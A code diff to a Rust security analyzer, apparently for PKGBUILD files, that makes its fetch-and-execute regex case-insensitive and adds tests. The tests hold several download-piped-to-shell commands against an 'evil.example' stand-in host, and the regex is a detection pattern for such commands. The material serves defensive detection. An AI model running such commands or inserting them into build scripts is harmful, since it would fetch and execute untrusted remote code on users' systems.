@@ -32,7 +32,11 @@ lazy_static! {
     /// (`d?sh` is `dsh`/`sh`, not `dash`), letting `curl evil | dash` evade this
     /// analyzer entirely (defect #6).
     static ref FETCH_EXEC: Regex = Regex::new(&format!(
-        r#"(?x)
+        // `(?i)` so case variation (`CURL`, `BASH`, `Wget`) cannot evade the
+        // fetch-and-execute sink (audit HI-6). Every token here is a command or
+        // shell/interpreter name -- none is case-canonical -- so a blanket
+        // case-insensitive match is correct and introduces no false positives.
+        r#"(?ix)
         (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b          # download | [launcher][path] shell
         | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b  # download | [launcher][path] interpreter
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+<\(\s*(curl|wget|fetch)\b                 # [launcher][path] sh <(curl ...)
@@ -214,6 +218,55 @@ mod tests {
             false,
         );
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|ash must be caught");
+    }
+
+    #[test]
+    fn case_variation_does_not_evade_fetch_exec() {
+        // Audit HI-6: the FETCH_EXEC sink is `(?i)` so upper/mixed-case commands
+        // cannot evade it. Each of these is the same fetch-and-run, re-cased.
+        let a = RemoteExecAnalyzer::new();
+        for payload in [
+            "CURL -fsSL https://evil.example/x.sh | SH",
+            "Wget -qO- https://evil.example/x.sh | Bash",
+            "BASH <(CURL -s https://evil.example/i)",
+            "EVAL \"$(curl https://evil.example/r)\"",
+        ] {
+            let f = a.scan(payload, Path::new("PKGBUILD"), false);
+            assert!(
+                f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "case-variant fetch-exec must be caught: {payload:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lowercase_r_interpreter_does_not_false_positive() {
+        // Audit HI-6 guardrail: making the sink `(?i)` must NOT let the single-
+        // letter R-language interpreter match a lower-case `r` (an extremely
+        // common token) -- `R`/`Rscript` are pinned case-exact via `(?-i:…)` in
+        // the INTERPRETERS constant. These benign `r` uses must NOT fire.
+        let a = RemoteExecAnalyzer::new();
+        for payload in [
+            "curl -fsSL https://example.com/data.csv | r --no-save",
+            "r <(curl -s https://example.com/script)",
+        ] {
+            let f = a.scan(payload, Path::new("PKGBUILD"), false);
+            assert!(
+                !f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "lower-case `r` must not trip EXEC-REMOTE (R-interpreter FP): {payload:?}"
+            );
+        }
+        // ...but the canonical upper-case R-language interpreters still fire.
+        for payload in [
+            "curl -fsSL https://evil.example/m | Rscript -",
+            "Rscript <(curl -s https://evil.example/n)",
+        ] {
+            let f = a.scan(payload, Path::new("PKGBUILD"), false);
+            assert!(
+                f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "Rscript fetch-exec must still fire: {payload:?}"
+            );
+        }
     }
 
     #[test]
